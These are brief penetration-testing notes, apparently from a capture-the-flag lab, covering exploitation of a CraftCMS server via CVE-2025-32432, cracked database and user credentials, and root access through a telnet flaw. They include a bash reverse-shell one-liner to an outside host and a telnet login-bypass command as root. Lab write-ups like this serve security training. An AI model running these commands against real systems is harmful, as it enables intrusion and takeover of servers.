- Nmap scan
	- ![[Pasted image 20260723093527.png]]


- This web is using CraftCMS
	- ![[Pasted image 20260723095032.png]]
	- Might be vulnerable to cve-2025-32432
	- CVE-2025-32432: By sending crafted requests to the image transform feature, attackers can exploit insecure deserialization and execute arbitrary PHP code, potentially leading to a full server takeover.

- Found it in msfconsole
	- ![[Pasted image 20260723095126.png]]
	- ![[Pasted image 20260723100029.png]]
	- exploitable
	- Found the credential for the mysql database
		- ![[Pasted image 20260723101458.png]]
		- root:SuperSecureCraft123Pass!
		- Use reverse shell for more convenience: `/bin/bash -i >& /dev/tcp/10.10.14.236/8000 0>&1`
		- Upgrade to TTY: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
		- Found the credential for adam:
			- ![[Pasted image 20260723102926.png]]
			- Hash: `$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS`
			- ![[Pasted image 20260723103405.png]]
			- adam:darkangel
			- SSH to him
				- ![[Pasted image 20260723103458.png]]

- Check for listening services
	- ![[Pasted image 20260723114537.png]]
	- We have telnet in port 23 
	- ![[Pasted image 20260723114608.png]]
	- Version 2.7 is vulnerable to cve-2026-24061
	- `USER='-f root' telnet -a 127.0.0.1`
	- ![[Pasted image 20260723115022.png]]